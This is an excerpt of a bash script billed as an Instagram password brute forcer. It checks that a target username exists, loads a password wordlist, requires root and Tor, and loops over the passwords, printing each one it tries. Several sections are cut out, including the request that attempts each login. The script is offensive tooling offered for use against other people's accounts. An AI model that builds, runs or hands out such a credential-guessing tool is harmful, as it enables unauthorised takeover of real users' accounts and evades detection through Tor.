#!/bin/bash
# Coded by:CMAX-KAUSAR 
# www.github.com/mdkausar295
clear
echo 'LOADING....'
sleep 0.5
clear
...
sleep 1
clear
toilet -f future "CODED BY CMAX-KAUSAR" -F gay
sleep 2
clear
echo "OK...!"
sleep 1
...
echo '  coded by CMAX-KAUSAR                                        \                  /'
echo ' __  __ ____                                      _________))                ((__________'
echo '|  \/  |  _ \                                    /.-------./\\    \    /    //\.--------.\'
echo '| |\/| | |_) |                                  //#######//##\\   ))  ((   //##\\########\\'
echo '| |  | |  _ <                                  //#######//###((  ((    ))  ))###\\########\\'
echo '|_|  |_|_| \_                                 ((#######((#####\\  \\  //  //#####))########))'
echo '            CMAX-KAUSAR Brute Forcer v1.0.0     \##` `###\######\\  \)(/  //######/####` `##/'
echo '  ==========================================      )`    ``#)`  `##\`->oo<-`/##`  `(#``     `('
echo '  =Team    : BD AT SQUAD                   =             (       ``\`... `/``       )'
echo '  =Creadby : BD AT SQUAD (CMAX-KAUSAR)     =                        \""  /'
echo '  =Contact : allincmax-kausar@gmail.com    =                         \ "`/'
echo '  =YouTube : BD AT SQUAD.                  =                         / "/'
echo '  ==========================================                        ( /\'
echo '                                                                    /\| \'
echo '                                                                   (  \'
echo '                                                                       )'
...
function start() {
read -p $'\e[1;92m[+]Username account: \e[0m' user
checkaccount=$(curl -L -s https://www.instagram.com/$user/ | grep -c "the page  removed")
if [[ "$checkaccount" == 1 ]]; then
printf "\e[1;91m[!]Invalid Username! Try again\e[0m\n"
sleep 1
start
else
default_wl_pass="passwords.lst"
read -p $'\e[1;92m[+]Password List (Enter to default list): \e[0m' wl_pass
...
checkroot() {
if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[1;77m[!] run this program as root!\n\e[0m"
    exit 1
fi
}
...
command -v tor > /dev/null 2>&1 || { echo >&2 " tor  it's not installed. Run ./install.sh. Exiting..."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 " curl  it's not installed. Run ./install.sh. Exiting..."; exit 1; }
command -v openssl > /dev/null 2>&1 || { echo >&2 " openssl  it's not installed. Run ./install.sh Exiting..."; exit 1; }

command -v awk > /dev/null 2>&1 || { echo >&2 " awk  it's not installed. Exiting..."; exit 1; }
command -v sed > /dev/null 2>&1 || { echo >&2 "e sed  it's not installed. Exiting..."; exit 1; }
command -v cat > /dev/null 2>&1 || { echo >&2 " cat it's not installed. Exiting..."; exit 1; }
command -v tr > /dev/null 2>&1 || { echo >&2 " tr  it's not installed. Exiting..."; exit 1; }
command -v wc > /dev/null 2>&1 || { echo >&2 " wc  it's not installed. Exiting..."; exit 1; }
command -v cut > /dev/null 2>&1 || { echo >&2 " cut  it's not installed. Exiting..."; exit 1; }
command -v uniq > /dev/null 2>&1 || { echo >&2 " uniq  it's not installed. Exiting..."; exit 1; }
...
if [[ -n "$threads" ]]; then
printf "\n"
printf "\e[1;91m [!] Waiting  shutting down...\n\e[0m"
...
let counter++
printf "\e[1;77m[*]Trying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass
